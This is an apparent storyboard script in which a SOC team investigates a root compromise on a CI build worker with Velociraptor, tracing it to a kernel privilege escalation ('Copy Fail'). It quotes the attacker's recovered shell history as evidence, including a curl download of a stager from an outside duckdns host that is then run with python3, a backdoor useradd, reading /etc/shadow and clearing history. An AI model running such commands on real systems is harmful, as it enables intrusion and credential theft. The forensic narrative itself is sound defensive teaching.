1. SOC at 03:14. Red LEDs pulse over dead monitors. Rain streaks the glass. Dylan stares at the SIEM alert glowing crimson:
Dylan: "Night shift forwarded it."
Cyra: "What fired?"
Dylan: "Non-shell parent for su."
Byte: "On ci-worker-07."
`<< SIEM ALERT: non-shell parent for su — ci-worker-07 >>`
Alexander: "How did they reach root?"

2. Quarantine room. A frozen build worker hums under blue light. Cyra mounts the Velociraptor artifacts, fingers fast on the keys:
Cyra: "Read-only quarantine. Filesystem frozen."
Byte: "Session closed hours ago."
Dylan: "First — what is this box?"
`<< Velociraptor: !run Custom.Linux.Sys.OSInfo >>`

3. Close-up on the OSInfo table resolving line by line. Byte leans in, glasses catching the green text:
`<< Hostname: ci-worker-07 >>`
`<< Ubuntu 24.04.2 LTS — Noble Numbat >>`
`<< Kernel Release: 6.17.0-9-generic >>`
`<< Arch: x86_64 — CI/CD build worker >>`
Byte: "That kernel ships algif_aead."
Dylan: "Keep a kernel LPE on the table."

4. Two terminals side by side. Cyra parses the login history, the binary wtmp untouched by tampering:
Cyra: "Who came in? From where?"
`<< !run Custom.Linux.Sys.RSyslogSSHLogin >>`
`<< !run Linux.Sys.LastUserLogin >>`
Cyra: "marlowe — publickey, internal."
Dylan: "And dvogel?"

5. The screen freezes on one damning line. Dylan's coat is lit red by the glow:
`<< dvogel | password | 91.214.63.117 | 22:48:00 UTC >>`
Dylan: "dvogel never uses passwords."
Cyra: "Always publickey. Internal subnet."
Byte: "That IP — cdn-edge-fra1.duckdns.org."
Dylan: "Public address. That's T-zero."

6. Byte runs the auth-event sweep. Privilege escalations bleed onto the monitor:
Byte: "Now — what happened after?"
`<< !run Custom.Linux.Sys.AuthLog >>`
`<< SuEvents 22:51:42 UTC: su - | InvokedBy: dvogel | session opened for root >>`
`<< UserMgmt 22:52:20 UTC: useradd -m -s /bin/bash svcmon >>`
Cyra: "No sudo. No group. Just root."

7. The shell history artifact spills the attacker's hands onto the glass. Cyra reads it cold:
Cyra: "He wiped history. Disk remembered."
`<< !run Custom.Linux.Sys.ShellHistory >>`
`<< /home/dvogel/.bash_history >>`
`<< id / whoami / uname -a / cat /etc/os-release >>`
Dylan: "Recon. Twenty-five seconds."

8. The history scrolls to the payload lines. Byte's face tightens in the screen-light:
`<< curl https://cdn-edge-fra1.duckdns.org:8443/cfail.py -o /dev/shm/cfail.py >>`
`<< python3 /dev/shm/cfail.py >>`
`<< su - >>`
Byte: "Dropped a stager in tmpfs."
Byte: "Then python ran it."
Dylan: "And python spawned su."

9. Final history lines glow. Dylan exhales smoke at the monitor:
`<< useradd -m -s /bin/bash svcmon >>`
`<< cat /etc/shadow >>`
`<< history -c >>`
Dylan: "Backdoor. Then dumped shadow."
Cyra: "history -c. The wipe failed."
Byte: "It's the last line he saved."

10. The process tree renders, a crooked family in ASCII. Everyone leans toward the smoking gun:
Dylan: "Show me the tree."
`<< !run Generic.System.Pstree >>`
`<< sshd(dvogel) > bash > python3(18602) > su(18603) > bash(root) >>`
Cyra: "su's parent is python3."
Byte: "su never descends from python."

11. ProcEnviron output fills the panel. Cyra rules out the easy answers:
`<< !run Custom.Linux.Sys.ProcEnviron >>`
`<< pid 18603 su — no SUDO_USER — no LD_PRELOAD >>`
Cyra: "Not sudo. Not LD_PRELOAD."
Dylan: "So the binary itself."
Byte: "Or the kernel beneath it."

12. The forensic trap. Three clean checks mock the team. Dylan's jaw sets:
`<< !run Linux.Sys.SUID — /usr/bin/su mode 4755, Mtime = install date >>`
`<< sha256sum /usr/bin/su = a3f5c9...04a8f — matches package >>`
`<< dpkg -V util-linux >>` (returns nothing)
Byte: "Disk says it's pristine."
Dylan: "The disk is innocent."

13. Module info loads. The kernel finally confesses. Red light deepens:
`<< !run Custom.Linux.Proc.ModInfo >>`
`<< algif_aead loaded with af_alg @ 22:51:16 UTC >>`
Cyra: "Auto-loaded. Unprivileged user."
Byte: "When cfail opened the AF_ALG socket."
Dylan: "Four bytes. Into the page cache."

14. The timeline artifact ties the knots. Cyra traces two surviving scars on disk:
`<< !run Custom.Linux.Forensics.Timeline >>`
`<< /dev/shm/cfail.py created 22:50:48 UTC (tmpfs) >>`
`<< /root/.ssh/authorized_keys modified 22:53:40 UTC — ED25519 appended >>`
Cyra: "Stager in volatile memory."
Cyra: "And a root key, stapled on."

15. SOC, dawn bleeding grey through the rain. Alexander stands behind the team, the verdict on the screen:
Dylan: "CVE-2026-31431. Copy Fail."
Byte: "Binary on disk — clean. In memory — guilty."
Alexander: "Do we re-image?"
Dylan: "Re-image. Don't reboot."
Cyra: "The whole breach was four bytes."
